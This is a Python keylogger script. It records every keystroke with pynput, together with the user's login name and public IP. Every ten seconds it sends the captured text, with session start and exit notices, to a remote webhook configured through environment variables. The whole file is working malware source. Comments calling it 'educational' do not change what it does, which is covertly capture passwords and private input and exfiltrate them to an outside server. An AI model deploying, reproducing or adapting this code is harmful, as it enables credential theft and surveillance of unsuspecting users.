from pynput import keyboard
import requests
import time
import os
import random
import atexit
from dotenv import load_dotenv

# Load environment variables from a .env file
load_dotenv()

# Safe placeholders (make sure to define these in a .env file)
webhook_url = os.getenv("WEBHOOK_URL")  # Example: https://your.server/api/endpoint
token = os.getenv("TOKEN")

# Random ID per session
session_id = random.randint(1, 10000)

text_to_send = ""
previous_key = ""

# User/system info
user_login = os.getlogin()
public_ip = requests.get('https://api.ipify.org').text

def on_press(key):
    """Capture keystrokes."""
    global text_to_send, previous_key
    try:
        text_to_send += key.char
    except AttributeError:
        if previous_key != key:
            text_to_send += f"[{key}]"
        previous_key = key

def send_data():
    """Send logged keys to the webhook."""
    global text_to_send
    if text_to_send:
        message = f"[{session_id}] {text_to_send}"
        headers = {
            "Content-Type": "text/plain",
            "Authorization": f"{token}"
        }
        response = requests.post(webhook_url, data=message.encode(), headers=headers)
        if response.status_code == 200:
            print("[✓] Sent successfully")
            text_to_send = ""
        else:
            print(f"[!] Failed to send. Status: {response.status_code}")

def before_exit():
    """Notify server when script is closed."""
    message = f"User {session_id} with IP {public_ip} closed the script."
    headers = {
        "Content-Type": "text/plain",
        "Authorization": f"{token}"
    }
    try:
        requests.post(webhook_url, data=message.encode(), headers=headers)
    except Exception as e:
        print(f"[!] Error on exit: {e}")

atexit.register(before_exit)

def main():
    """Main keylogger loop (for educational/demo purposes only)."""
    last_sent = time.time()
    interval = 10  # Send every 10s

    system_name = "Windows" if os.name == 'nt' else "Unix-like"
    startup_message = f"\nNew user\nLogin: {user_login}\nSession ID: {session_id}\nIP: {public_ip}\nSystem: {system_name}"
    headers = {
        "Content-Type": "text/plain",
        "Authorization": f"{token}"
    }

    try:
        requests.post(webhook_url, data=startup_message.encode(), headers=headers)
    except:
        print("[!] Failed to notify on start.")

    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            if time.time() - last_sent >= interval:
                send_data()
                last_sent = time.time()
            time.sleep(1)

if __name__ == "__main__":
    print("[i] Keylogger running (educational mode)")
    main()
